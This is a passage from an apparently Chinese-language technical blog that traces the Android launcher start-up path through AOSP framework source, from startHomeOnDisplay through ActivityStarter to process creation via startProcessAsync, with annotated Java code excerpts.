class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">startHomeOnDisplay</span><span class="params">(<span class="type">int</span> userId,String reason,<span class="type">int</span> displayId,<span class="type">boolean</span> allowInstrumenting,<span class="type">boolean</span> fromHomeKey)</span>&#123;</span><br><span class="line">    <span class="comment">// Fallback to top focused display if the displayId is invalid.</span></span><br><span class="line">    <span class="keyword">if</span>(displayId==INVALID_DISPLAY)&#123;</span><br><span class="line">        displayId=getTopDisplayFocusedStack().mDisplayId;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Intent homeIntent=<span class="literal">null</span>;</span><br><span class="line">    ActivityInfo aInfo=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(displayId==DEFAULT_DISPLAY)&#123;</span><br><span class="line">        <span class="comment">//拿到需要启动launcher的intent，通过resolveHomeActivity解析出需要启动的Activity</span></span><br><span class="line">        homeIntent=mService.getHomeIntent();</span><br><span class="line">        aInfo=resolveHomeActivity(userId,homeIntent);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(shouldPlaceSecondaryHomeOnDisplay(displayId))&#123;</span><br><span class="line">        Pair&lt;ActivityInfo, Intent&gt; info=resolveSecondaryHomeActivity(userId,displayId);</span><br><span class="line">        aInfo=info.first;</span><br><span class="line">        homeIntent=info.second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(aInfo==<span class="literal">null</span>||homeIntent==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!canStartHomeOnDisplay(aInfo,displayId,allowInstrumenting))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Updates the home component of the intent.</span></span><br><span class="line">    homeIntent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(aInfo.applicationInfo.packageName,aInfo.name));</span><br><span class="line">    homeIntent.setFlags(homeIntent.getFlags()|FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">    <span class="comment">// Updates the extra information of the intent.</span></span><br><span class="line">    <span class="keyword">if</span>(fromHomeKey)&#123;</span><br><span class="line">        homeIntent.putExtra(WindowManagerPolicy.EXTRA_FROM_HOME_KEY,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Update the reason for ANR debugging to verify if the user activity is the one that</span></span><br><span class="line">    <span class="comment">// actually launched.</span></span><br><span class="line">    <span class="keyword">final</span> String myReason=reason+<span class="string">&quot;:&quot;</span>+userId+<span class="string">&quot;:&quot;</span>+UserHandle.getUserId(</span><br><span class="line">    aInfo.applicationInfo.uid)+<span class="string">&quot;:&quot;</span>+displayId;</span><br><span class="line">    mService.getActivityStartController().startHomeActivity(homeIntent,aInfo,myReason,</span><br><span class="line">    displayId);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以分为两步看：<br>  1、通过ActivityTaskManagerService的getHomeIntent（）获取到需要启动的intent，在通过resolveHomeActivity（）解析出需要启动Activity的信息，<br>  2、mService.getActivityStartController()获取到的是ActivityStartController，这个类的主要作用是用于控制委派启动的Activity。<br>先来看下ActivityTaskManagerService的getHomeIntent() :<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent <span class="title function_">getHomeIntent</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(mTopAction, mTopData != <span class="literal">null</span> ? Uri.parse(mTopData) : <span class="literal">null</span>);</span><br><span class="line">    intent.setComponent(mTopComponent);</span><br><span class="line">    intent.addFlags(Intent.FLAG_DEBUG_TRIAGED_MISSING);</span><br><span class="line">    <span class="keyword">if</span> (mFactoryTest != FactoryTest.FACTORY_TEST_LOW_LEVEL) &#123;</span><br><span class="line">        intent.addCategory(Intent.CATEGORY_HOME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意看 intent.addCategory(Intent.CATEGORY_HOME) ，这个代表的就是要启动Activity的意图，通常来说，整个系统的只会有一个应用会在清单文件中配置CATEGORY_HOME，如果配置了多个，系统在启动的时候就会要求用户手动去选择哪个作为启动应用，如果在系统设置应用中进行配置了，就会选择配置的那个应用启动。（这个 CATEGORY_HOME 配置，说白了就只有 launcher 程序才会有）。<br>回到主线，接着看mService.getActivityStartController().startHomeActivity() :<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStartController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">startHomeActivity</span><span class="params">(Intent intent, ActivityInfo aInfo, String reason,</span></span><br><span class="line"><span class="params">        TaskDisplayArea taskDisplayArea)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActivityOptions</span> <span class="variable">options</span> <span class="operator">=</span> ActivityOptions.makeBasic();</span><br><span class="line">    options.setLaunchWindowingMode(WINDOWING_MODE_FULLSCREEN);</span><br><span class="line">    <span class="keyword">if</span> (!ActivityRecord.isResolverActivity(aInfo.name)) &#123;</span><br><span class="line">        <span class="comment">// The resolver activity shouldn&#x27;t be put in home stack because when the foreground is</span></span><br><span class="line">        <span class="comment">// standard type activity, the resolver activity should be put on the top of current</span></span><br><span class="line">        <span class="comment">// foreground instead of bring home stack to front.</span></span><br><span class="line">        options.setLaunchActivityType(ACTIVITY_TYPE_HOME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">displayId</span> <span class="operator">=</span> taskDisplayArea.getDisplayId();</span><br><span class="line">    options.setLaunchDisplayId(displayId);</span><br><span class="line">    options.setLaunchTaskDisplayArea(taskDisplayArea.mRemoteToken</span><br><span class="line">            .toWindowContainerToken());</span><br><span class="line">    <span class="comment">// The home activity will be started later, defer resuming to avoid unneccerary operations</span></span><br><span class="line">    <span class="comment">// (e.g. start home recursively) when creating home stack.</span></span><br><span class="line">    mSupervisor.beginDeferResume();</span><br><span class="line">    <span class="keyword">final</span> ActivityStack homeStack;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Make sure home stack exists on display area.</span></span><br><span class="line">        homeStack = taskDisplayArea.getOrCreateRootHomeTask(ON_TOP);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mSupervisor.endDeferResume();</span><br><span class="line">    &#125;</span><br><span class="line">    mLastHomeActivityStartResult = obtainStarter(intent, <span class="string">&quot;startHomeActivity: &quot;</span> + reason)</span><br><span class="line">            .setOutActivity(tmpOutRecord)</span><br><span class="line">            .setCallingUid(<span class="number">0</span>)</span><br><span class="line">            .setActivityInfo(aInfo)</span><br><span class="line">            .setActivityOptions(options.toBundle())</span><br><span class="line">            .execute();</span><br><span class="line">    mLastHomeActivityStartRecord = tmpOutRecord[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (homeStack.mInResumeTopActivity) &#123;</span><br><span class="line">        <span class="comment">// If we are in resume section already, home activity will be initialized, but not</span></span><br><span class="line">        <span class="comment">// resumed (to avoid recursive resume) and will stay that way until something pokes it</span></span><br><span class="line">        <span class="comment">// again. We need to schedule another resume.</span></span><br><span class="line">        mSupervisor.scheduleResumeTopActivities();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> A starter to configure and execute starting an activity. It is valid until after</span></span><br><span class="line"><span class="comment"> *         &#123;<span class="doctag">@link</span> ActivityStarter#execute&#125; is invoked. At that point, the starter should be</span></span><br><span class="line"><span class="comment"> *         considered invalid and no longer modified or used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ActivityStarter <span class="title function_">obtainStarter</span><span class="params">(Intent intent, String reason)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mFactory.obtain().setIntent(intent).setReason(reason);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要是先获取一个ActivityStarter（主要用于启动Activity），然后把需要的参数设置进去，最后再调用它的ActivityStarter.execute（）方法：<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStarter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ... ...</span><br><span class="line">        <span class="keyword">final</span> LaunchingState launchingState;</span><br><span class="line">        <span class="keyword">synchronized</span> (mService.mGlobalLock) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">caller</span> <span class="operator">=</span> ActivityRecord.forTokenLocked(mRequest.resultTo);</span><br><span class="line">            <span class="comment">// 通过ActivityMetricsLogger.notifyActivityLaunching创建LaunchingState并记录创建Activity开始的时间</span></span><br><span class="line">            launchingState = mSupervisor.getActivityMetricsLogger().notifyActivityLaunching(</span><br><span class="line">                    mRequest.intent, caller);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br><span class="line">        <span class="comment">// 执行启动请求</span></span><br><span class="line">        res = executeRequest(mRequest);</span><br><span class="line">        ... ...</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Notify ActivityMetricsLogger that the activity has launched.</span></span><br><span class="line">        <span class="comment">// ActivityMetricsLogger will then wait for the windows to be drawn and populate</span></span><br><span class="line">        <span class="comment">// WaitResult.</span></span><br><span class="line">        <span class="comment">// 通过ActivityMetricsLogger.notifyActivityLaunched记录Activity启动完成的时间</span></span><br><span class="line">        mSupervisor.getActivityMetricsLogger().notifyActivityLaunched(launchingState, res,</span><br><span class="line">                mLastStartActivityRecord);</span><br><span class="line">        <span class="comment">// 同时将Request.waitResult添加到ActivityStackSupervisor的mWaitingActivityLaunched中，等待窗口绘制完成</span></span><br><span class="line">        <span class="keyword">return</span> getExternalResult(mRequest.waitResult == <span class="literal">null</span> ? res</span><br><span class="line">                : waitForResult(res, mLastStartActivityRecord));        </span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            onExecutionComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上面代码我们知道，启动是在 executeRequest() 方法里：<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStarter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">executeRequest</span><span class="params">(Request request)</span> &#123;</span><br><span class="line">... ...</span><br><span class="line">    <span class="comment">//调用 startActivityUnchecked</span></span><br><span class="line">    mLastStartActivityResult = startActivityUnchecked(r, sourceRecord, voiceSession,</span><br><span class="line">            request.voiceInteractor, startFlags, <span class="literal">true</span> <span class="comment">/* doResume */</span>, checkedOptions, inTask,</span><br><span class="line">            restrictedBgActivity, intentGrants);</span><br><span class="line">    <span class="keyword">return</span> mLastStartActivityResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityStarter.startActivityUnchecked()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStarter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">startActivityUnchecked</span><span class="params">(<span class="keyword">final</span> ActivityRecord r, ActivityRecord sourceRecord,</span></span><br><span class="line"><span class="params">            IVoiceInteractionSession voiceSession, IVoiceInteractor voiceInteractor,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> startFlags, <span class="type">boolean</span> doResume, ActivityOptions options, Task inTask,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> restrictedBgActivity, NeededUriGrants intentGrants)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> START_CANCELED;</span><br><span class="line">  ... ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//延时布局</span></span><br><span class="line">        mService.deferWindowLayout();</span><br><span class="line">        <span class="comment">//执行startActivityInner</span></span><br><span class="line">        result = startActivityInner(r, sourceRecord, voiceSession, voiceInteractor,</span><br><span class="line">                startFlags, doResume, options, inTask, restrictedBgActivity, intentGrants);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//恢复布局</span></span><br><span class="line">        mService.continueWindowLayout();</span><br><span class="line">    &#125;</span><br><span class="line">  ... ...</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityStarter.startActivityInner()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStarter.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">startActivityInner</span><span class="params">()</span> &#123; </span><br><span class="line">    ... ...</span><br><span class="line">       <span class="keyword">if</span> (mDoResume) &#123;</span><br><span class="line">            <span class="comment">//ActivityRecord 记录着 Activity 信息</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">topTaskActivity</span> <span class="operator">=</span></span><br><span class="line">                    mStartActivity.getTask().topRunningActivityLocked();</span><br><span class="line">            <span class="keyword">if</span> (!mTargetStack.isTopActivityFocusable()</span><br><span class="line">                    || (topTaskActivity != <span class="literal">null</span> &amp;&amp; topTaskActivity.isTaskOverlay()</span><br><span class="line">                    &amp;&amp; mStartActivity != topTaskActivity)) &#123;</span><br><span class="line">                mTargetStack.getDisplay().mDisplayContent.executeAppTransition();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//执行resumeFocusedStacksTopActivities</span></span><br><span class="line">                mRootWindowContainer.resumeFocusedStacksTopActivities(</span><br><span class="line">                        mTargetStack, mStartActivity, mOptions);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="keyword">return</span> START_SUCCESS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>RootWindowContainer.resumeFocusedStacksTopActivities()<br><strong>frameworks/base/services/core/java/com/android/server/wm/RootWindowContainer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeFocusedStacksTopActivities</span><span class="params">(</span></span><br><span class="line"><span class="params">            ActivityStack targetStack, ActivityRecord target, ActivityOptions targetOptions)</span> &#123;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="comment">//如果是栈顶Activity，启动resumeTopActivityUncheckedLocked</span></span><br><span class="line">        <span class="keyword">if</span> (targetStack != <span class="literal">null</span> &amp;&amp; (targetStack.isTopStackInDisplayArea()</span><br><span class="line">                || getTopDisplayFocusedStack() == targetStack)) &#123;</span><br><span class="line">            result = targetStack.resumeTopActivityUncheckedLocked(target, targetOptions);</span><br><span class="line">        &#125;</span><br><span class="line">    ... ...</span><br><span class="line">        <span class="keyword">if</span> (!resumedOnDisplay) &#123;</span><br><span class="line">            <span class="comment">//获取栈顶的 ActivityRecord</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ActivityStack</span> <span class="variable">focusedStack</span> <span class="operator">=</span> display.getFocusedStack();</span><br><span class="line">            <span class="keyword">if</span> (focusedStack != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//执行resumeTopActivityUncheckedLocked</span></span><br><span class="line">                result |= focusedStack.resumeTopActivityUncheckedLocked(target, targetOptions);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (targetStack == <span class="literal">null</span>) &#123;</span><br><span class="line">                    result |= resumeHomeActivity(<span class="literal">null</span> <span class="comment">/* prev */</span>, <span class="string">&quot;no-focusable-task&quot;</span>,</span><br><span class="line">                            display.getDefaultTaskDisplayArea());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityStack.resumeTopActivityUncheckedLocked()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStack.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">resumeTopActivityUncheckedLocked</span><span class="params">(ActivityRecord prev, ActivityOptions options)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mInResumeTopActivity) &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t even start recursing.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        mInResumeTopActivity = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 执行 resumeTopActivityInnerLocked,</span></span><br><span class="line">        <span class="comment">// 最终调用到 ActivityStackSupervisor.startSpecificActivity()</span></span><br><span class="line">        result = resumeTopActivityInnerLocked(prev, options);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">next</span> <span class="operator">=</span> topRunningActivity(<span class="literal">true</span> <span class="comment">/* focusableOnly */</span>);</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">null</span> || !next.canTurnScreenOn()) &#123;</span><br><span class="line">            checkReadyForSleep();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mInResumeTopActivity = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityStackSupervisor.startSpecificActivity()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityStackSupervisor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">startSpecificActivity</span><span class="params">(ActivityRecord r, <span class="type">boolean</span> andResume, <span class="type">boolean</span> checkConfig)</span> &#123;</span><br><span class="line">    <span class="comment">// Is this activity&#x27;s application already running?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">WindowProcessController</span> <span class="variable">wpc</span> <span class="operator">=</span></span><br><span class="line">            mService.getProcessController(r.processName, r.info.applicationInfo.uid);</span><br><span class="line"> </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">knownToBeDead</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//进程存在</span></span><br><span class="line">    <span class="keyword">if</span> (wpc != <span class="literal">null</span> &amp;&amp; wpc.hasThread()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//真正启动Activity方法</span></span><br><span class="line">            realStartActivityLocked(r, wpc, andResume, checkConfig);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;Exception when starting activity &quot;</span></span><br><span class="line">                    + r.intent.getComponent().flattenToShortString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If a dead object exception was thrown -- fall through to</span></span><br><span class="line">        <span class="comment">// restart the application.</span></span><br><span class="line">        knownToBeDead = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    r.notifyUnknownVisibilityLaunchedForKeyguardTransition();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isTop</span> <span class="operator">=</span> andResume &amp;&amp; r.isTopRunningActivity();</span><br><span class="line">    <span class="comment">//进程不存在 mService =ATMS</span></span><br><span class="line">    mService.startProcessAsync(r, knownToBeDead, isTop, isTop ? <span class="string">&quot;top-activity&quot;</span> : <span class="string">&quot;activity&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startSpecificActivity() 这个方法是关键方法，如果进程已经存在直接执行 realStartActivityLocked 去启动 Activity，进程不存在则通过AMS去创建 Socket，然后通知 Zygote 去 fork 进程。由于这里第一次创建，所以会走到 startProcessAsync() 。<br>Launcher启动流程调用栈：<br><img src="/images/20231125/20231125001.jpg"></p><p>创建Socket建立连接<br>ActivityTaskManagerService.startProcessAsync()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">startProcessAsync</span><span class="params">(ActivityRecord activity, <span class="type">boolean</span> knownToBeDead, <span class="type">boolean</span> isTop,</span></span><br><span class="line"><span class="params">        String hostingType)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Trace.isTagEnabled(TRACE_TAG_WINDOW_MANAGER)) &#123;</span><br><span class="line">            Trace.traceBegin(TRACE_TAG_WINDOW_MANAGER, <span class="string">&quot;dispatchingStartProcess:&quot;</span></span><br><span class="line">                    + activity.processName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Post message to start process to avoid possible deadlock of calling into AMS with the</span></span><br><span class="line">        <span class="comment">// ATMS lock held.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">m</span> <span class="operator">=</span> PooledLambda.obtainMessage(ActivityManagerInternal::startProcess,</span><br><span class="line">                mAmInternal, activity.processName, activity.info.applicationInfo, knownToBeDead,</span><br><span class="line">                isTop, hostingType, activity.intent.getComponent());</span><br><span class="line">        mH.sendMessage(m);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Trace.traceEnd(TRACE_TAG_WINDOW_MANAGER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过handler发消息执行ActivityManagerInternal.startProcess() ，内部又转调用ActivityManagerService.startProcessLocked() :<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GuardedBy(&quot;this&quot;)</span></span><br><span class="line"><span class="keyword">final</span> ProcessRecord <span class="title function_">startProcessLocked</span><span class="params">(String processName,</span></span><br><span class="line"><span class="params">        ApplicationInfo info, <span class="type">boolean</span> knownToBeDead, <span class="type">int</span> intentFlags,</span></span><br><span class="line"><span class="params">        HostingRecord hostingRecord, <span class="type">int</span> zygotePolicyFlags, <span class="type">boolean</span> allowWhileBooting,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> isolated, <span class="type">boolean</span> keepIfLarge)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mProcessList.startProcessLocked(processName, info, knownToBeDead, intentFlags,</span><br><span class="line">            hostingRecord, zygotePolicyFlags, allowWhileBooting, isolated, <span class="number">0</span> <span class="comment">/* isolatedUid */</span>,</span><br><span class="line">            keepIfLarge, <span class="literal">null</span> <span class="comment">/* ABI override */</span>, <span class="literal">null</span> <span class="comment">/* entryPoint */</span>,</span><br><span class="line">            <span class="literal">null</span> <span class="comment">/* entryPointArgs */</span>, <span class="literal">null</span> <span class="comment">/* crashHandler */</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mProcessList类型是ProcessList，这是一个进程管理类，描述了进程的adj值，当系统资源吃紧时，就会根据这里描述的adj去判断杀死哪个应用来释放资源，可以通过adb shell dumpsys 